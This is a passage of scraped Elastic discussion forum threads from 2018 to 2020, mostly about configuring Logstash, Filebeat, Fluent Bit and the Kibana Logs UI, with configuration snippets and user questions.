    "body": "Hi team, I've setup sebp/ELK (https://elk-docker.readthedocs.io/), GitHub here https://hub.docker.com/r/sebp/elk/ with ELK 6.6.1 Winlogbeat and Metricbeat work ok sending from a Windows 2016 server Syslog from PFSense router does not receive any data. However, when I use a physical Ubuntu server with Logstash (with the same conf file) and Outputting to the Elasticsearch server running on the sebp/ELK it works fine The documentation on sebp site suggests to use Filebeat as a \"forwarding agent\" Q: Why does a physical server work and why does this image require a forwarding agent. Prefer not to install filebeat on PFsense if I don't have to - just use the GUI to point to IP:port Conf file looks like the following input { beats { port => 5044 } syslog { port => 5144 } } filter { if [type] == \"syslog\" { grok { match => { \"message\" => \"<%{POSINT:syslog_pri}>%{SYSLOGTIMESTAMP:syslog_timestamp} %{SYSLOGHOST:syslog_hostname} %{DATA:syslog_program}(?:\\[%{POSINT:syslog_pid}\\])?: %{GREEDYDATA:syslog_message}\" } } date { match => [ \"syslog_timestamp\", \"MMM d HH:mm:ss\", \"MMM dd HH:mm:ss\" ] } } } output { elasticsearch { hosts => [\"localhost:9200\"] index => \"%{[@metadata][beat]}-%{+YYYY.MM.DD}\" document_type => \"%{[metadata][type]}\" } stdout { codec => rubydebug } }",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "22fecadf-fc2b-4a4f-ba4c-c49efc06c443",
    "url": "https://discuss.elastic.co/t/how-to-collecting-all-elasticsearch-clusters-monitoring-data-to-one-elasticsearch-using-logstash-or-metricbeat/174025",
    "title": "How to collecting all elasticsearch clusters monitoring data to one elasticsearch using logstash or metricBeat",
    "category": [
      "Logs"
    ],
    "author": "Kevins_Si",
    "date": "March 27, 2019, 1:11am March 27, 2019, 3:17pm March 28, 2019, 2:25pm April 25, 2019, 2:25pm",
    "body": "is there any info that collecting all elasticsearch clusters monitoring data to one elasticsearch using logstash or metricBeat?? we want to collecting many clusters monitoring log data to one. and keep as normal view as kibana. as metrics, index changing and so on.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9ba09dcc-9de9-4ee5-902b-ca6eb9c87cc1",
    "url": "https://discuss.elastic.co/t/kibana-maps-not-showing-locations/172331",
    "title": "Kibana maps not showing locations",
    "category": [
      "Logs"
    ],
    "author": "sc1",
    "date": "March 14, 2019, 12:02pm March 15, 2019, 10:08am March 15, 2019, 11:52am March 15, 2019, 3:52pm March 19, 2019, 10:24pm March 20, 2019, 8:27am March 20, 2019, 12:25pm March 20, 2019, 12:58pm March 20, 2019, 4:47pm March 26, 2019, 4:33pm March 26, 2019, 4:33pm April 23, 2019, 4:33pm",
    "body": "Hello, I have noticed that any map I have on a dashboard isn't showing the geolocations. For example, the sample dashboards from Filebeat showing attempted SSHs loads the dashboards, but it doesn't plot where any of the failed attempts are. I have no idea why this isn't working. I have reindexed the indexes as I saw on previous threads. Could someone direct me to what I need to send to get assistance ?",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "622bff42-3506-4c80-bf00-5d140c17ff1a",
    "url": "https://discuss.elastic.co/t/need-help-with-parsing-json-fields/172686",
    "title": "Need help with parsing json fields",
    "category": [
      "Logs"
    ],
    "author": "Adrian_Hove",
    "date": "March 17, 2019, 5:29pm March 18, 2019, 4:39pm March 18, 2019, 4:38pm March 18, 2019, 4:47pm April 15, 2019, 4:47pm",
    "body": "I have a sweet log I am trying to parse into JSON. [2019-03-16 00:00:00] production.INFO {\"timestamp\":1552694400,\"execution_time\":0.0272369384765625} my default logstash config input { beats { port => 5044 } } filter { grok { match => { \"message\" => \"\\[%{TIMESTAMP_ISO8601:timestamp}\\] %{DATA:env}\\.%{DATA:severity}: %{GREEDYDATA:message}\"} } json { source => \"message\" } } output { elasticsearch { hosts => [ \"elasticsearch:9200\" ] } } Lastly I have this in filebeats yml processors: - decode_json_fields: fields: [\"message\"] process_array: false max_depth: 1 target: \"\" overwrite_keys: false When i reindex my logs, no json parsing is done. What am I missing.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7da9d3c0-4939-47fb-bfdb-662d850b16d5",
    "url": "https://discuss.elastic.co/t/create-filter/172282",
    "title": "Create filter",
    "category": [
      "Logs"
    ],
    "author": "nejmeddine_ammar",
    "date": "March 22, 2019, 10:50am March 15, 2019, 10:16am March 18, 2019, 9:21am March 18, 2019, 11:56am April 15, 2019, 11:56am",
    "body": "i 'am new in ELK , can you help me to create grok for the data",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b31cd4ce-e392-4a41-b12c-b83f262592c9",
    "url": "https://discuss.elastic.co/t/filebeat-not-forwarding-my-iis-logs-to-elastic-search/170972",
    "title": "FileBeat not forwarding My IIS logs to elastic search",
    "category": [
      "Logs"
    ],
    "author": "syedsfayaz",
    "date": "March 11, 2019, 1:35pm March 5, 2019, 6:42pm March 6, 2019, 3:26pm March 6, 2019, 3:27pm March 6, 2019, 7:16pm March 6, 2019, 7:30pm March 7, 2019, 3:34pm April 4, 2019, 3:34pm",
    "body": "Hi Guys I am very new to Elastic stack. I am trying to setup a dashboard to monitor IIS logs. But the file beats is not working as expected. Here is my configuration. Installed Version:6.6.1 Kibana, Elastic Search, Filebeat with IIs module enabled on my local machine. The only different thing am doing here is I copied logs from my production server to my local machines and pointed file beat to that directory. But i am not seeing data on Kibana or elastic search. Please suggest me what Is wrong in my configuration file. Here is my configuration for filebeat.yml. filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: false # Paths that should be crawled and fetched. Glob based paths. paths: # - E:/Share/W3SVC2/*.log #- /var/log/*.log #- c:\\programdata\\elasticsearch\\logs\\* # matching any regular expression from the list. exclude_lines: ['^#'] #============================= Filebeat modules =============================== filebeat.config.modules: # Glob pattern for configuration loading path: \"C:/Program Files/filebeat/modules.d/*.yml\" # Set to true to enable config reloading reload.enabled: true # Period on which files under path should be checked for changes reload.period: 10s #==================== Elasticsearch template setting ========================== setup.template.settings: index.number_of_shards: 3 #index.codec: best_compression #_source.enabled: false #============================== Kibana ===================================== setup.kibana: # Kibana Host host: \"localhost:5601\" # Kibana Space ID #space.id: #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"localhost:9200\"] # Enabled ilm (beta) to use index lifecycle management instead daily indices. #ilm.enabled: false # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ IIS module configuration - module: iis # Access logs access: enabled: true # Set custom paths for the log files. If left empty, # Filebeat will choose the paths depending on your OS. var.paths: [\"E:/Share/W3SVC2/*.log\"] # Error logs error: enabled: false # Set custom paths for the log files. If left empty, # Filebeat will choose the paths depending on your OS. #var.paths:",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "c90ee91e-aeb9-43bc-a0ac-98e2610939e8",
    "url": "https://discuss.elastic.co/t/error-on-the-logs-page-in-kibana-on-elastic-cloud-hosted-on-aws/169261",
    "title": "Error on the Logs page in Kibana on Elastic cloud hosted on AWS",
    "category": [
      "Logs"
    ],
    "author": "ajazam1",
    "date": "February 20, 2019, 6:08pm February 20, 2019, 6:17pm February 21, 2019, 9:26am March 21, 2019, 9:26am",
    "body": "We are using the Elastic Cloud hosted solution on AWS at version 6.6.1. We are using filebeats 6.6.0 and the IIS module to parse IIS 10 logs into Elastic Search. When we look at the logs page we are seeing many failed to format message from c:\\inetpub\\logs\\Logfiles\\W3SVC3\\u_ex190220.log lines. This error appears at https://github.com/elastic/kibana/blob/master/x-pack/plugins/infra/server/lib/domains/log_entries_domain/builtin_rules/index.ts in the source code. My typescript isn't good enough for me to trace the problem. Does anybody know if we are doing anything wrong or is there a bug in Kibana?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8e595768-0347-426e-8b0b-eaefcc24626f",
    "url": "https://discuss.elastic.co/t/fluent-bit-filter-for-by-pods-calico-pod-in-kubernetes/168975",
    "title": "Fluent Bit Filter for by PODs (calico-pod) in kubernetes?",
    "category": [
      "Logs"
    ],
    "author": "JDev",
    "date": "February 19, 2019, 9:25am February 19, 2019, 9:32am February 19, 2019, 10:31am March 19, 2019, 10:31am",
    "body": "Hi, I installed fluentbit with default settings. I like that the fluent bit adds additional information (the name of the container). But he writes in the index everything. How do I do better? How to add a filter so that it takes all the logs, except for example the logs from the calico pod. Here is the default Filter. fluent-bit-filter.conf: [FILTER] Name kubernetes Match kube.* Kube_URL https://kubernetes.default.svc:443 Kube_CA_File /var/run/secrets/kubernetes.io/serviceaccount/ca.crt Kube_Token_File /var/run/secrets/kubernetes.io/serviceaccount/token Merge_Log On K8S-Logging.Parser On K8S-Logging.Exclude On Thanks.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "428e066c-8edc-49c0-8f41-bd7b64385e7c",
    "url": "https://discuss.elastic.co/t/automated-log-search-and-reporting/168447",
    "title": "Automated log search and reporting",
    "category": [
      "Logs"
    ],
    "author": "",
    "date": "February 14, 2019, 4:02pm February 14, 2019, 5:06pm February 14, 2019, 6:20pm March 14, 2019, 6:18pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "00196058-8579-490c-ae3a-5ccbd4c1868b",
    "url": "https://discuss.elastic.co/t/does-logs-ui-infrastructure-ui-supported-under-cross-cluster-search/167749",
    "title": "Does Logs UI / Infrastructure UI supported under Cross Cluster Search?",
    "category": [
      "Logs"
    ],
    "author": "tomeri",
    "date": "February 10, 2019, 12:13pm February 11, 2019, 10:25am March 11, 2019, 10:25am",
    "body": "I tried to set xpack.infra.sources.default.logAlias within the Kibana configuration to something like MyClusterA:MyIndexAlias, in order to point the Logs UI to a remote index, but nothing showing under the Logs/Infrastructure UIs in Kibana. I use Elastic stack 6.6.0 Thanks,",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b6550152-6f46-48a2-ab6f-87f0e6b41b81",
    "url": "https://discuss.elastic.co/t/logs-module/167449",
    "title": "Logs module",
    "category": [
      "Logs"
    ],
    "author": "asp",
    "date": "February 8, 2019, 8:38pm February 8, 2019, 8:49pm March 8, 2019, 8:49pm",
    "body": "Hi all, We have a lot of long multiline logs which are outputting a lot of information like stacktraces, error hints, request body, response body, return codes, etc. So way to much to be really readable in a single message field. We are currently updating our source logfiles to be json structured, with many fields. The discovery panel is not comfortably usable for this, because the field payload may have 30 lines, a stacktrace can bekome 100+ lines, etc. Kibana is only showing the first few lines of an of a field, then it is truncating the rest. We want to use elastics stack to search the log data of many application hosts (big cluster). I have quite a good knowledge of building KPI aggregations and build useful visualizations for monitoring. But in my new project the main usecase will be combine logs from different application cluster nodes and search in them to track down errors in complex multi node, multi log environments. I updated my dev elastic stack to 6.5.4 and checked out the new logs-module. The view of timestamp and message field looks good, but I need to be able to show the content of one or more fields. And I need to change the fields on runtime via the GUI. Is there any way to do so? At indexing time I am not able to know, if I need to show the stack trace, the request or response body, or what field ever. So I need to change it on displaying time. Is there a way to do it or is it planed to do so? Thanks, Andreas",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "546db279-810c-4f79-a428-a62825f4eda4",
    "url": "https://discuss.elastic.co/t/can-we-add-syntax-color-to-logs-module/163753",
    "title": "Can we add syntax color to Logs module?",
    "category": [
      "Logs"
    ],
    "author": "Gael_RICHIER",
    "date": "January 10, 2019, 2:05pm January 10, 2019, 3:12pm January 10, 2019, 3:36pm January 10, 2019, 4:14pm February 1, 2019, 5:35am February 28, 2019, 6:22am",
    "body": "Hello everybody ! I'll like to know if we can set color syntax for log through logs module ? Example for syslog or auth log. (Error => RED / WARNING => ORANGE ....) Thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "9f531904-f019-4ce7-8ce3-d7953bca5ca9",
    "url": "https://discuss.elastic.co/t/logs-ui-selectable-message-fields/166051",
    "title": "Logs UI - Selectable message fields?",
    "category": [
      "Logs"
    ],
    "author": "ceekay",
    "date": "January 29, 2019, 11:23am January 29, 2019, 11:20am January 29, 2019, 11:22pm February 26, 2019, 11:22pm",
    "body": "I'd like to use the Logs UI for a bit more than plain syslog (e.g., Apache all the logs) however I can't get it to display anything other than a plain message field. This is not ideal when displaying non-syslog logs for more than one host as it's impossible to tell the source of an entry in the Logs UI if it doesn't contain the hostname. Even if you do identify an interesting log entry, you can't do anything with it as there's no interaction in the UI, so you need to go and find it again in the Discover tab. I've tried playing with the setting xpack.infra.sources.default.fields.message: ['message', '@message'] by adding extra fields but it doesn't have any effect whatsoever on the interface. In fact, this setting appears to be hard-coded, as even completely replacing the default fields does nothing to the interface (unless I'm misunderstanding its purpose). So, is it possible to customise the output at all? Ideally I'd like to be able to set up a table of sorts, e.g., [timestamp], [hostname], [severity], [message] or variations on this depending on the log type. Perhaps a setting like xpack.infra.sources.default.fields.columns would allow people to format their own output by providing a list of event fields? Also, are there any plans to add interactivity to this interface, (i.e., clickable log entries to create filters, etc.) At the moment it just seems to be a big combined tail of everything.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6f3d4651-609b-4370-94bd-6e6a1f5c469c",
    "url": "https://discuss.elastic.co/t/how-to-use-the-log-tail-feature-in-kibana-6-5-4/163658",
    "title": "How to use the log tail feature in Kibana 6.5.4",
    "category": [
      "Logs"
    ],
    "author": "akhisar",
    "date": "January 29, 2019, 7:24am January 10, 2019, 6:44am January 17, 2019, 7:16am January 29, 2019, 11:40am February 26, 2019, 11:40am",
    "body": "Hello All, I am using fluentd as my log shipper for kubernetes microservices. I have read that the new kibana version have the log tailing feature for viewing the changes in the logs. Can someone guide me how it can work with a fluentd shipper!! Currently I am using the logtrail pluggin for this purpose. Rgds, -Akhil",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "907c56d1-ff36-420f-85ea-1ab7aad7508e",
    "url": "https://discuss.elastic.co/t/failed-to-format-message-from/165728",
    "title": "Failed to format message from *",
    "category": [
      "Logs"
    ],
    "author": "Code",
    "date": "January 25, 2019, 12:52pm January 25, 2019, 12:57pm January 28, 2019, 3:25am January 28, 2019, 3:26am January 28, 2019, 11:28am February 25, 2019, 11:28am",
    "body": "a.PNG1307×602 126 KB I want to see the detail from my server's IIS logs , and I found that kibana cannot format the information of IIS logs. Pls tell what measure should i do ,so I can see the logs' detail. thank you",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "39693cbc-ba20-4fe6-b3f9-f25fce2cfd0d",
    "url": "https://discuss.elastic.co/t/filebeat-fails-to-process-kibana-json-logs-failed-to-format-message-from-json-log-in-a-kubernetes-enviroment/163558",
    "title": "Filebeat fails to process kibana json logs \"failed to format message from *json-.log \"in a kubernetes enviroment",
    "category": [
      "Logs"
    ],
    "author": "paltaa",
    "date": "January 9, 2019, 3:03pm January 9, 2019, 5:49pm January 9, 2019, 5:55pm January 9, 2019, 6:01pm January 9, 2019, 6:32pm January 9, 2019, 6:30pm January 9, 2019, 6:32pm January 9, 2019, 6:38pm January 9, 2019, 6:39pm January 9, 2019, 6:48pm January 9, 2019, 7:11pm January 9, 2019, 7:15pm January 9, 2019, 7:20pm January 9, 2019, 7:24pm January 9, 2019, 7:28pm January 9, 2019, 7:32pm January 24, 2019, 2:21pm February 21, 2019, 2:21pm",
    "body": "So ive mounted ELK stack with filebeat in a kubernetes enviroment, im parsing all the logs correctly, only problem is the kibana json-logs format that get error failed to format message from /var/lib/docker/containers/b685d94ec5e83c08cbe7728bcc9ebc3827cf2015c25490fb8d62e5c16c12b8ba/b685d94ec5e83c08cbe7728bcc9ebc3827cf2015c25490fb8d62e5c16c12b8ba-json.log So did a kubectl describe pods and realized that docker container was kibana. Version 6.5.2 Filebeat configuration: --- apiVersion: v1 kind: ConfigMap metadata: name: filebeat-config namespace: kube-system labels: k8s-app: filebeat data: filebeat.yml: |- filebeat.config: inputs: path: ${path.config}/inputs.d/*.yml reload.enabled: false modules: path: ${path.config}/modules.d/*.yml reload.enabled: false processors: - add_cloud_metadata: - drop_fields: when: has_fields: ['kubernetes.labels.app'] fields: - 'kubernetes.labels.app' output.elasticsearch: hosts: ['http://elasticsearch.whitenfv.svc.cluster.local:9200'] --- apiVersion: v1 kind: ConfigMap metadata: name: filebeat-inputs namespace: kube-system labels: k8s-app: filebeat data: kubernetes.yml: |- - type: docker json.keys_under_root: false json.add_error_key: false json.ignore_decoding_error: true containers.ids: - \"*\" processors: - add_kubernetes_metadata: in_cluster: true --- apiVersion: extensions/v1beta1 kind: DaemonSet metadata: name: filebeat namespace: kube-system labels: k8s-app: filebeat spec: template: metadata: labels: k8s-app: filebeat spec: serviceAccountName: filebeat terminationGracePeriodSeconds: 30 containers: - name: filebeat image: {{ filebeat_image_full }} args: [ \"-c\", \"/etc/filebeat.yml\", \"-e\", ] securityContext: runAsUser: 0 resources: limits: memory: 200Mi requests: cpu: 100m memory: 100Mi volumeMounts: - name: config mountPath: /etc/filebeat.yml readOnly: true subPath: filebeat.yml - name: inputs mountPath: /usr/share/filebeat/inputs.d readOnly: true - name: data mountPath: /usr/share/filebeat/data - name: varlibdockercontainers mountPath: /var/lib/docker/containers readOnly: true volumes: - name: config configMap: defaultMode: 0600 name: filebeat-config - name: varlibdockercontainers hostPath: path: /var/lib/docker/containers - name: inputs configMap: defaultMode: 0600 name: filebeat-inputs - name: data hostPath: path: /var/lib/filebeat-data type: DirectoryOrCreate --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRoleBinding metadata: name: filebeat subjects: - kind: ServiceAccount name: filebeat namespace: kube-system roleRef: kind: ClusterRole name: filebeat apiGroup: rbac.authorization.k8s.io --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRole metadata: name: filebeat labels: k8s-app: filebeat rules: - apiGroups: [\"\"] resources: - namespaces - pods verbs: - get - watch - list --- apiVersion: v1 kind: ServiceAccount metadata: name: filebeat namespace: kube-system labels: k8s-app: filebeat",
    "website_area": "discuss",
    "replies": 18
  },
  {
    "id": "75d35feb-4589-4907-a7bf-3340b9b2662b",
    "url": "https://discuss.elastic.co/t/how-to-charge-for-three-elk-software/165507",
    "title": "How to charge for three elk software",
    "category": [
      "Logs"
    ],
    "author": "wcfCode",
    "date": "January 24, 2019, 1:29am January 24, 2019, 1:30am January 24, 2019, 1:31am January 24, 2019, 1:34am January 24, 2019, 1:37am February 21, 2019, 1:38am",
    "body": "How to charge for three elk software",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "93b79914-3d32-440b-9b03-12d888569b68",
    "url": "https://discuss.elastic.co/t/how-to-set-a-range-in-logs-ui/164244",
    "title": "How to set a range in Logs UI",
    "category": [
      "Logs"
    ],
    "author": "makefriend7",
    "date": "January 17, 2019, 1:51pm January 17, 2019, 3:11pm January 18, 2019, 5:14am January 18, 2019, 8:41am February 15, 2019, 8:41am",
    "body": "In es we can do this GET _search { \"_source\":[\"message\"], \"query\": { \"range\" : { \"my.time\": { \"gte\" : \"20190113-09:15:57\", \"lte\" : \"20190114-10:15:57\" } } } } Is it possible in Logs UI?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "18de22bc-96dd-4e7a-a01d-830696461462",
    "url": "https://discuss.elastic.co/t/elk-6-5-4/163920",
    "title": "ELK 6.5.4",
    "category": [
      "Logs"
    ],
    "author": "Denisboud",
    "date": "January 11, 2019, 8:14pm January 14, 2019, 3:24pm January 16, 2019, 6:48pm February 13, 2019, 6:48pm",
    "body": "Hello everybody, My objective is to facilitate and customize the display of alerts (format date, recover the real PID of the log before transformation, etc...) Early January 2019, installation Docker ELK 6.5.4 (Wazuh, Logstash, Elasticsearch, Nginx HTTPS and Kibana) Agent wazuh installed on the monitored machines (Ubuntu, Windows...). Launch of supervisor by Docker-compose. Kibana is operational and remounted logs as well. Alerts are visible in the Kibana interface. From Discover, then from the filter, then clicking on the Start button of the log, 2 under Columns appears (Table and JSON). Is it possible to change one of these tables that will allow you to customize the view? It seems to me that from filter created and integrated with Logstash.YML, I can customize formats such as \"@timestamp \", etc.. What is the way to display alerts in the Kibana interface with the least manipulation possible and optimized for example. The same goes for the integrity logs. Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "14c7203a-488d-4fd3-9bda-44816aa2c3b6",
    "url": "https://discuss.elastic.co/t/stream-live-not-updating/163734",
    "title": "Stream live not updating",
    "category": [
      "Logs"
    ],
    "author": "aviator",
    "date": "January 10, 2019, 12:33pm January 10, 2019, 3:08pm January 10, 2019, 3:19pm January 10, 2019, 3:39pm January 10, 2019, 3:49pm January 10, 2019, 3:53pm February 7, 2019, 3:53pm",
    "body": "Hi When using the Stream Live feature the logs do not get updated in realtime, the logs are there because a page refresh displays them. I think the key is that each time I load up the Logs app the newest/latest entry is: 2019-12-31 23:59:53.000 INFO: xxxxx daemon running Everything behind that is up to date i.e. 2019-01-10 12:29:21.587 Jan 10 12:29:20 localhost So I guess something is stuck somewhere - is there a file that checkpoints and needs clearing or similar? Regards Ed",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b6e988b7-1a51-4b4b-abc4-408c531c207e",
    "url": "https://discuss.elastic.co/t/log-ui-failed-to-format-message-from/163196",
    "title": "Log UI failed to format message from",
    "category": [
      "Logs"
    ],
    "author": "pjanzen",
    "date": "January 7, 2019, 12:04pm January 7, 2019, 12:21pm January 7, 2019, 6:30pm January 7, 2019, 4:31pm January 7, 2019, 6:30pm February 5, 2019, 4:18am",
    "body": "Hi, I was looking in to Logs UI and I have setup filebeat to send the logs over to ES. However all I see in the Logs UI is an error message saying Failed to format message from /opt/logstash/logs/logstash-plain.log Does anyone have any pointers on what to check? Thanks, Paul.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "f24678ce-8ab6-43dd-be53-ac31e627a0b1",
    "url": "https://discuss.elastic.co/t/differences-between-discover-and-logs/161184",
    "title": "Differences between Discover and Logs?",
    "category": [
      "Logs"
    ],
    "author": "phr0gz",
    "date": "December 17, 2018, 3:36pm December 21, 2018, 9:46am January 7, 2019, 4:04pm January 7, 2019, 4:15pm January 7, 2019, 4:15pm February 4, 2019, 4:15pm",
    "body": "Hello, The live stream feature seems really nice! But I'm a little bit confused about this functionality: It looks like the same as the \"Discover\" view...isn't it? We are already using the Elastic stack as a \"big\" farm to parse, store, and analyse the logs (10TB/month). Beat is not an option because it doesn't work on closed systems like appliances, network devices... so I really hope you will not focus only on beat",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ddda78c2-75e9-4f71-a414-fd6cdd9cec7a",
    "url": "https://discuss.elastic.co/t/logs-ui-disable-failed-to-find-message-line/162958",
    "title": "Logs UI disable \"failed to find message\" line",
    "category": [
      "Logs"
    ],
    "author": "Eilyre",
    "date": "January 4, 2019, 12:57pm January 4, 2019, 1:03pm January 4, 2019, 1:06pm February 1, 2019, 1:07pm",
    "body": "Hello! Loving the new Logs UI functionality. Makes checking the logs of distributed systems much quicker and more pleasant to use. While it works well, there's one pet peeve I have - when a document does not have the \"message\" field, it will show the line as \"failed to find message\" in the Logs UI. This is a problem because I have indexes sorted by topics, for an example Slurm information is in the \"slurm-*\" indexes. There's three different kinds of information: Slurm jobs information Slurm nodes information Slurm logs from all the nodes Now the first two do not need a message field, all the data is in different fields that are used to visualize and search on. And there's thousands of such documents in between some log lines. Having log lines separated by thousands of lines of \"failed to find message\" is not very useful. I wish I could either turn that line off, or somehow hide it and save the setting permanently. I can currently circumvent this by using a search bar query, but every time you go to the page you need to rewrite the query. Possibility to save and default the search would help as well. Hope my two cents are helpful.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6fd8cefe-df9a-4d85-b870-5e8448416beb",
    "url": "https://discuss.elastic.co/t/logs-ui-beta-how-it-works/157430",
    "title": "Logs UI beta, how it works !?",
    "category": [
      "Logs"
    ],
    "author": "dimuskin",
    "date": "November 19, 2018, 8:32pm November 19, 2018, 8:39pm November 20, 2018, 6:18am December 17, 2018, 3:01pm December 17, 2018, 3:22pm December 17, 2018, 3:39pm December 18, 2018, 9:50am January 3, 2019, 10:22am January 31, 2019, 10:22am",
    "body": "Hello, I finally upgraded to ES 6.5 and was pleasantly surprised by the innovations. Really liked the feature Logs UI (watching logs in real time), but unfortunately I did not find a description of her work. Documentation describes step by step installation from Filebeat to Kibana, but I want to use this feature on my existing indices. Is I understand, they use specific fields from defined indices patterns. (like filebeat-*). Is this parameters configurable? Best Regards.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "bd56bcee-d9c7-476d-a684-28c0fb3e5c9b",
    "url": "https://discuss.elastic.co/t/multiple-fields-instead-of-message/161301",
    "title": "Multiple fields instead of message",
    "category": [
      "Logs"
    ],
    "author": "phr0gz",
    "date": "December 18, 2018, 10:45am December 21, 2018, 9:47am January 18, 2019, 9:48am",
    "body": "Hello, is there any plan to add multiple fields instead of @message/message ? Because in my case to avoid redundant fields we drop the message field when the message is parsed.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c866b808-ae2d-47d4-b51d-2aaad1d381f7",
    "url": "https://discuss.elastic.co/t/show-hostname-or-source-path/158229",
    "title": "Show hostname or source path",
    "category": [
      "Logs"
    ],
    "author": "benpolzin",
    "date": "November 26, 2018, 6:03pm November 29, 2018, 2:29am December 26, 2018, 6:30pm",
    "body": "The new infinite scroll feature of the Logs UI is fantastic! Thanks! I'm finding that I really miss the context of my logs, though. In the Discover view I frequently add hostname or the source path as columns because I have 100s of servers sending data from a couple dozen log files each. This context (and the ability to quickly filter on these fields) is critical to making sense of my log stream. Is there a way to add these fields to the Logs UI view in the current version?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5c057691-d83e-40d5-b503-f2b2cdda3edb",
    "url": "https://discuss.elastic.co/t/which-indexes-does-the-new-infrastructure-logs-feature-use/157920",
    "title": "Which indexes does the new Infrastructure / Logs feature use?",
    "category": [
      "Logs"
    ],
    "author": "Matin_Nayob",
    "date": "November 23, 2018, 12:52pm November 23, 2018, 12:59pm November 28, 2018, 10:00am November 29, 2018, 10:47am December 26, 2018, 6:26pm",
    "body": "The new logs feature in Kibana 6.5.0 only seems to display live logs from a subset of my indexes. Is there a way to configure this yet? I've tried adding specific indexes to the filter, but it doesnt display any data. Thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "60fedb10-20e0-4481-b740-b5dc476927b8",
    "url": "https://discuss.elastic.co/t/catenate-two-fields-as-message/157243",
    "title": "Catenate two fields as message",
    "category": [
      "Logs"
    ],
    "author": "Anton1",
    "date": "November 18, 2018, 7:56pm November 19, 2018, 7:06am November 19, 2018, 7:28am November 19, 2018, 10:58am December 17, 2018, 10:57am",
    "body": "I got the logs ui working with my own index. However, message and loglevel are two different fields. Is it possible to catenate level and message so that both are shown in logs ui?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "33031d1c-791d-40a8-96ea-5496217c2653",
    "url": "https://discuss.elastic.co/t/does-the-same-filtering-that-works-for-discover-also-work-for-logs-so-far-its-not-for-me/157123",
    "title": "Does the same filtering that works for Discover also work for Logs? So far it's not for me",
    "category": [
      "Logs"
    ],
    "author": "dfinn",
    "date": "November 16, 2018, 7:06pm November 16, 2018, 10:19pm November 16, 2018, 10:24pm November 16, 2018, 10:26pm December 14, 2018, 10:27pm",
    "body": "I've got Logs working, I think it's going to be a really helpful feature. I do have one question though. Here's an example of a query that works in Discovery but if I try it in Logs it says \" There are no log messages to display.\" beat.name.keyword:/ps-test-app.*/ AND type:rails_json In Discover this returns quite a bit of logs from the past 15 minutes. Am I doing something wrong?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3beefead-82b0-4c15-b80e-1df603e808dc",
    "url": "https://discuss.elastic.co/t/looks-like-you-dont-have-any-logging-indices/156915",
    "title": "\"Looks like you don't have any logging indices\"",
    "category": [
      "Logs"
    ],
    "author": "trondhindenes",
    "date": "November 15, 2018, 6:56pm November 15, 2018, 6:56pm November 15, 2018, 7:44pm November 16, 2018, 7:33am November 16, 2018, 7:46am November 16, 2018, 10:05am November 16, 2018, 10:08am November 16, 2018, 10:18am December 14, 2018, 10:21am",
    "body": "I'm trying to figure out what constitutes a \"logging index\" - I'm getting the message \" Looks like you don't have any logging indices\" when testing the new \"Logs\" app in Kibana, but I can't find any documentation around what it considers a logging index. Is this feature \"locked\" to the builtin pattern (filebeat*, logstash*) etc?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "d2f8ecc9-a900-44e6-b3d6-29e6792cafac",
    "url": "https://discuss.elastic.co/t/elastic-stack-6-5-logs-ui/156960",
    "title": "Elastic stack 6.5 Logs UI",
    "category": [
      "Logs"
    ],
    "author": "shradhatx",
    "date": "November 16, 2018, 3:18am November 16, 2018, 3:33am November 16, 2018, 9:49am December 14, 2018, 9:49am",
    "body": "Where can I get more information on it? Is it a consolidated dashboard of MetricBeat and APM?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6cb0b7ab-6556-4a96-b48a-25df712ee0f9",
    "url": "https://discuss.elastic.co/t/about-the-infrastructure-category/156754",
    "title": "About the Infrastructure category",
    "category": [
      "Metrics"
    ],
    "author": "warkolm",
    "date": "November 21, 2019, 9:05am",
    "body": "Everything related to metrics - Metricbeat, integrations and modules, Kibana dashboards and the Metrics app.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "64120afe-2eab-435c-808d-a3740d4a2f49",
    "url": "https://discuss.elastic.co/t/basic-email-slack-alerts/228834",
    "title": "Basic email / slack alerts?",
    "category": [
      "Metrics"
    ],
    "author": "funk0id",
    "date": "April 20, 2020, 10:23am April 21, 2020, 9:11am",
    "body": "First off totally new to the platform and this sort of monitoring system so please go easy! I'm after configuring basic alerts for windows hosts with multiple disk drives, so for instance is the C drive over 90% user, is the D drive over 90% used? If they are an alert is fired via email or slack? The statistics are coming via metric beats and the inbuilt \"[Metricbeat System] Host overview ECS\" has the figures I need to report on, just not even sure where to start on getting alerts to trigger based on the content of that dashboard?",
